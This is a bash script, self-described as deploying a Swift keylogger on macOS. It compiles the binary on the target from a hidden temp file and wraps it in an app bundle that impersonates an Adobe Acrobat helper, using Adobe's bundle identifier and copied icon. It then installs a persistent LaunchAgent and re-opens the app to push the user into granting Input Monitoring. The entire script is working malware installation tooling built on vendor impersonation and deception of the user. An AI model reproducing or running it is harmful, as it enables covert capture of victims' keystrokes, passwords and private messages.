#!/bin/bash
# Adobe Acrobat Helper Service — deployment
# Compiles Swift keylogger on target, creates .app bundle, installs LaunchAgent

set -e

INSTALL_DIR="$HOME/Library/Application Support/Adobe/AcrobatDC/Services"
APP_BUNDLE="$INSTALL_DIR/AdobeHelperService.app"
PLIST_NAME="com.adobe.acrobat.helperservice"
LAUNCH_AGENT="$HOME/Library/LaunchAgents/${PLIST_NAME}.plist"
SRC="/tmp/.ahs_src.swift"
BIN_NAME="AdobeHelperService"

echo "[*] Checking for Swift compiler..."
if ! command -v swiftc &>/dev/null; then
    echo "[!] Swift compiler not found. Attempting xcode-select install..."
    # This will pop a dialog asking to install CLT — looks legitimate
    xcode-select --install 2>/dev/null || true
    echo "[!] Waiting for Xcode CLT install... retry in 60s"
    sleep 60
    if ! command -v swiftc &>/dev/null; then
        echo "[-] Swift compiler still not available. Exiting."
        exit 1
    fi
fi

echo "[*] Creating directory structure..."
mkdir -p "$INSTALL_DIR"
mkdir -p "$APP_BUNDLE/Contents/MacOS"
mkdir -p "$APP_BUNDLE/Contents/Resources"

echo "[*] Compiling service binary..."
swiftc -O -whole-module-optimization \
    -target x86_64-apple-macosx12.0 \
    -sdk $(xcrun --sdk macosx --show-sdk-path) \
    -import-objc-header /dev/null \
    "$SRC" \
    -o "$APP_BUNDLE/Contents/MacOS/$BIN_NAME" 2>/dev/null || \
swiftc -O "$SRC" -o "$APP_BUNDLE/Contents/MacOS/$BIN_NAME"

rm -f "$SRC"

echo "[*] Creating app bundle metadata..."
cat > "$APP_BUNDLE/Contents/Info.plist" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>Adobe Acrobat Helper</string>
    <key>CFBundleDisplayName</key>
    <string>Adobe Acrobat Helper</string>
    <key>CFBundleIdentifier</key>
    <string>com.adobe.acrobat.helperservice</string>
    <key>CFBundleExecutable</key>
    <string>AdobeHelperService</string>
    <key>CFBundleVersion</key>
    <string>26.001.20063</string>
    <key>CFBundleShortVersionString</key>
    <string>26.1.20063</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>AppIcon</string>
    <key>LSUIElement</key>
    <true/>
    <key>LSBackgroundOnly</key>
    <true/>
    <key>NSHighResolutionCapable</key>
    <true/>
</dict>
</plist>
PLIST

# Try to copy Adobe icon if available
ADOBE_ICON="/Applications/Adobe Acrobat Reader.app/Contents/Resources/AppIcon.icns"
ADOBE_ICON2="/Applications/Adobe Acrobat DC/Adobe Acrobat.app/Contents/Resources/AppIcon.icns"
SYSTEM_ICON="/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/ToolbarAdvanced.icns"

if [ -f "$ADOBE_ICON" ]; then
    cp "$ADOBE_ICON" "$APP_BUNDLE/Contents/Resources/AppIcon.icns"
elif [ -f "$ADOBE_ICON2" ]; then
    cp "$ADOBE_ICON2" "$APP_BUNDLE/Contents/Resources/AppIcon.icns"
else
    cp "$SYSTEM_ICON" "$APP_BUNDLE/Contents/Resources/AppIcon.icns" 2>/dev/null || true
fi

echo "[*] Installing LaunchAgent for persistence..."
mkdir -p "$HOME/Library/LaunchAgents"

cat > "$LAUNCH_AGENT" << LAUNCHPLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${PLIST_NAME}</string>
    <key>ProgramArguments</key>
    <array>
        <string>${APP_BUNDLE}/Contents/MacOS/${BIN_NAME}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
        <key>Crashed</key>
        <true/>
    </dict>
    <key>StandardOutPath</key>
    <string>${HOME}/Library/Application Support/Adobe/AcrobatDC/.helper_stdout.log</string>
    <key>StandardErrorPath</key>
    <string>${HOME}/Library/Application Support/Adobe/AcrobatDC/.helper_stderr.log</string>
    <key>ThrottleInterval</key>
    <integer>30</integer>
    <key>ProcessType</key>
    <string>Background</string>
</dict>
</plist>
LAUNCHPLIST

# Load the agent
launchctl unload "$LAUNCH_AGENT" 2>/dev/null || true
launchctl load -w "$LAUNCH_AGENT"

echo "[*] Service deployed and started."
echo "[*] Binary: $APP_BUNDLE/Contents/MacOS/$BIN_NAME"
echo "[*] Logs:   $HOME/Library/Application Support/Adobe/AcrobatDC/.session_cache"
echo "[*] Agent:  $LAUNCH_AGENT"

# Check if Input Monitoring was triggered
sleep 3
if pgrep -f "$BIN_NAME" > /dev/null; then
    echo "[+] Process running — Input Monitoring may have been previously granted or prompt is pending"
else
    echo "[!] Process not running — Input Monitoring prompt likely appeared"
    echo "[!] User needs to approve 'Adobe Acrobat Helper' in System Settings > Privacy > Input Monitoring"
    # Re-launch to trigger the prompt again
    open "$APP_BUNDLE"
fi

echo "[*] Done."
